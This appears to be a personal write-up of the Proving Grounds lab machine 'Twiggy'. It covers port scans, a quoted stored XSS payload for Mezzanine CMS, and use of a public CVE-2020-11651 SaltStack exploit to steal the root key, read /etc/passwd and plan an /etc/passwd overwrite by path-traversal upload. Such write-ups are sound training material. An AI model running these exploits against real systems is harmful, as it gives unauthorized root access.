---
layout: post
title:  "Write Up: Proving Grounds Practice - Twiggy"
date:   2024-07-23 11:32:11 -0400
categories: oscp proving-grounds TJNull
---


192.168.169.62

sudo nmap -sV -sC -p- -oA Twiggy 192.168.169.62

Nmap scan report for 192.168.169.62
Host is up (0.023s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Home | Mezzanine
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).


=====> port 53
nmap 192.168.169.62 --script=dns-zone-transfer -p 53

└─$ nmap 192.168.169.62 --script=dns-zone-transfer -p 53
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 16:53 EDT
Nmap scan report for 192.168.169.62
Host is up (0.023s latency).

PORT   STATE SERVICE
53/tcp open  domain

Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds



─$ nmap 192.168.169.62 --script=dns-* -p 53            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 16:54 EDT
Nmap scan report for 192.168.169.62
Host is up (0.025s latency).

PORT   STATE SERVICE
53/tcp open  domain
|_dns-nsec-enum: Can't determine domain for host 192.168.169.62; use dns-nsec-enum.domains script arg.
|_dns-fuzz: Server didn't response to our probe, can't fuzz
|_dns-nsec3-enum: Can't determine domain for host 192.168.169.62; use dns-nsec3-enum.domains script arg.

Host script results:
| dns-blacklist: 
|   SPAM
|     dnsbl.inps.de - FAIL
|   PROXY
|_    tor.dan.me.uk - FAIL
|_dns-brute: Can't guess domain of "192.168.169.62"; use dns-brute.domain script argument.

Nmap done: 1 IP address (1 host up) scanned in 12.19 seconds

============================================================

=======================> port 80
mezzanine cms
/usr/share/exploitdb/exploits/python/webapps/40799.txt


gobuster dir -u 192.168.169.62 -w /usr/share/wordlists/dirb/common.txt

gobuster dir -u http://192.168.169.62 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o Twiggy-dir --exclude-length 0



Leave a comment, as author name use '"><img src=no onerror=alert(1)> To trigger
the payload, view the comment overview in the admin backend: http://
localhost:8000/admin/generic/threadedcomment


=====================================================================

======> port 8000
returns: {"clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"], "return": "Welcome"}

searching returns https://salt-sproxy.readthedocs.io/en/latest/examples/salt_api.html

found this guy - https://www.exploit-db.com/exploits/48421


https://github.com/jasperla/CVE-2020-11651-poc

after running `pip3 install salt' the following kinda works:

 python3 exploit.py --master 192.168.169.62 --read /etc/passwd 



└─$  python3 exploit.py --master 192.168.169.62 --read /etc/passwd 
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.11/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.169.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: 3J+XIUkNF7hBV4vmBMThrOVNtk/MMCHmT7QoUZ9lmQL9u4EJafv/kEAnCeEpdZRrgO7g2dEL2Ho=
[+] Attemping to read /etc/passwd from 192.168.169.62
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin



we are gonna make a fake passwd file and upload it

password
$1$SXMne/xK$xUFA6oQva4AG.vIx7wfh40


python3 exploit.py --master 192.168.169.62 --upload-src passwd --upload-dest ../../../../../../../etc/passwd





